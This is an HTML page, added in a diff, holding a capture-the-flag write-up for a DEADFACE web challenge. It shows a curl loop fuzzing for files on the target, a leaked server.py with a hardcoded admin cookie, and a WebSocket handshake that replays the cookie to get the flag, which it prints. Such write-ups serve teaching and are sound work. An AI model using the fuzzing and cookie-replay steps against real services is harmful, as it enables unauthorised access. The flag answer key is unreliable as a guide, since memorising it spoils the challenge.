@@ -1,0 +1,83 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Grave Encounters — Jerry&#x27;s Leaks — Writeup — arwah</title><meta name="description" content="A static movie board on port 8080 leaks its own backend source code (/server.py), which contains a privileged session cookie. Replaying that cookie in a WebSocket handshake to the…"><link rel="icon" href="/favicon.svg"><link rel="stylesheet" href="/writeups/writeups.css?v=20261019-2"></head><body><header class="library-nav"><a href="/#writeups">← Portfolio</a><a href="/writeups/">Writeup library</a></header><main><div class="article-meta">Web · 3 min read</div><details class="contents"><summary>On this page</summary><ul><li><a href="#summary">Summary</a></li><li><a href="#recon">Recon</a></li><li><a href="#talking-to-the-websocket">Talking to the WebSocket</a></li><li><a href="#jerry-s-leak">Jerry&#x27;s leak</a></li><li><a href="#asking-nicely">Asking nicely</a></li><li><a href="#flag">Flag</a></li><li><a href="#lessons">Lessons</a></li></ul></details><article class="prose"><h1 id="grave-encounters-jerry-s-leaks-writeup">Grave Encounters — Jerry's Leaks — Writeup</h1>
+<p><strong>Category:</strong> Web / Network Services
+<strong>Challenge:</strong> &quot;The DEADFACE crew set up a discussion board to pick movies for
+their Halloween marathon. Their sysadmin, Jerry, was in a hurry, and left more
+exposed than a movie board should. Find what Jerry leaked and ask the server
+nicely for its secret.&quot;
+<strong>Target:</strong> <code>170.187.156.131</code> (web board on <strong>:8080</strong>, WebSocket on <strong>:8765</strong>;
+port 8443 is a different challenge — off limits)
+<strong>Flag:</strong> <code>deadface{serve_me_up_a_flag}</code></p>
+<h2 id="summary">Summary</h2>
+<p>A static movie board on port 8080 leaks its own backend source code
+(<code>/server.py</code>), which contains a privileged session cookie. Replaying that
+cookie in a WebSocket handshake to the board's member-tools server on port 8765
+promotes the session to admin, and the <code>get_flag</code> command hands over the flag.</p>
+<h2 id="recon">Recon</h2>
+<p>Port 80 redirects to a dead 443; the board itself lives on <strong>:8080</strong> —
+&quot;Grave Encounters :: Halloween Movie Marathon&quot;, a static HTML lineup served by
+<code>SimpleHTTP/0.6 Python/3.13.12</code>. The footer does the OSINT for us:</p>
+<pre><code>Grave Encounters v0.3 · built in a hurry by jerry · happy haunting
+</code></pre>
+<p>The page's inline JS leaks the real attack surface — a WebSocket backend:</p>
+<pre><code class="language-js">const WS_URL = (location.protocol === &quot;https:&quot; ? &quot;wss://&quot; : &quot;ws://&quot;)
+             + location.hostname + &quot;:8765&quot;;
+...
+ws.onopen = () =&gt; { ws.send(JSON.stringify({cmd:&quot;list&quot;})); };
+</code></pre>
+<h2 id="talking-to-the-websocket">Talking to the WebSocket</h2>
+<p>A quick raw-WebSocket client (HTTP <code>Upgrade</code> handshake, masked text frames)
+speaks JSON to <code>ws://170.187.156.131:8765</code>:</p>
+<pre><code>-&gt; {&quot;cmd&quot;:&quot;list&quot;}    &lt;- {&quot;type&quot;: &quot;movies&quot;, &quot;movies&quot;: [{&quot;title&quot;: &quot;Hereditary&quot;, ...
+-&gt; {&quot;cmd&quot;:&quot;status&quot;}  &lt;- {&quot;type&quot;: &quot;status&quot;, &quot;admin&quot;: false}     &lt;-- interesting
+-&gt; {&quot;cmd&quot;:&quot;vote&quot;}    &lt;- {&quot;error&quot;: &quot;this board is read-only&quot;}
+-&gt; {&quot;cmd&quot;:&quot;get_flag&quot;}&lt;- {&quot;error&quot;: &quot;forbidden: admin session required&quot;}
+</code></pre>
+<p>So there is an admin state and a flag command gated behind a session.</p>
+<h2 id="jerry-s-leak">Jerry's leak</h2>
+<p>A light file fuzz against the static server (no port scanning, no 8443) turns
+up the sysadmin's mistake:</p>
+<pre><code>$ for f in admin backup server.py spooky_board.log ...; do curl -so /dev/null
+    -w &quot;%{http_code} /$f\n&quot; http://170.187.156.131:8080/$f; done
+200 /server.py
+</code></pre>
+<p><code>http://170.187.156.131:8080/server.py</code> serves the entire board source:</p>
+<pre><code class="language-python">FLAG1 = &quot;deadface{serve_me_up_a_flag}&quot;
+ADMIN_COOKIE_VALUE = &quot;s3ssion=adm1n-3f9a7c21b8d4e6f0&quot;  # privileged session (from NFS log)
+
+def cookie_of(ws):
+    return ws.request.headers.get(&quot;Cookie&quot;, &quot;&quot;)
+
+async def handler(ws):
+    is_admin = ADMIN_COOKIE_VALUE in cookie_of(ws)
+    ...
+        elif cmd == &quot;get_flag&quot;:
+            if is_admin:
+                await ws.send(json.dumps({&quot;type&quot;: &quot;flag&quot;, &quot;flag&quot;: FLAG1}))
+</code></pre>
+<p>Admin is decided purely by a <code>Cookie:</code> header substring match —
+<code>s3ssion=adm1n-3f9a7c21b8d4e6f0</code>.</p>
+<h2 id="asking-nicely">Asking nicely</h2>
+<p>Reconnect to the WebSocket with the leaked cookie in the handshake, then run
+<code>get_flag</code>:</p>
+<pre><code class="language-python">req = (&quot;GET / HTTP/1.1\r\nHost: 170.187.156.131:8765\r\n&quot;
+       &quot;Upgrade: websocket\r\nConnection: Upgrade\r\n&quot;
+       f&quot;Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n&quot;
+       &quot;Cookie: s3ssion=adm1n-3f9a7c21b8d4e6f0\r\n\r\n&quot;)
+</code></pre>
+<pre><code>-&gt; {&quot;cmd&quot;:&quot;status&quot;}    &lt;- {&quot;type&quot;: &quot;status&quot;, &quot;admin&quot;: true}
+-&gt; {&quot;cmd&quot;:&quot;get_flag&quot;}  &lt;- {&quot;type&quot;: &quot;flag&quot;, &quot;flag&quot;: &quot;deadface{serve_me_up_a_flag}&quot;}
+</code></pre>
+<h2 id="flag">Flag</h2>
+<pre><code>deadface{serve_me_up_a_flag}
+</code></pre>
+<h2 id="lessons">Lessons</h2>
+<ul>
+<li>Source-code disclosure beats brute force: one 200 on <code>/server.py</code> gave the
+auth model, the privileged cookie, and the flag command in a single request.</li>
+<li>WebSocket services are unauthenticated by default — the handshake's
+application-level <code>Cookie</code> header <em>was</em> the entire security model, and
+cookies are trivially replayable.</li>
+<li>Client-side JS is reconnaissance: the board HTML advertised the port, the
+protocol, and the command schema for a service that has no other front door.</li>
+</ul>
+</article><a class="back-link" href="/writeups/">← All writeups</a></main><footer>CTF solutions &amp; security notes · arwah</footer></body></html>
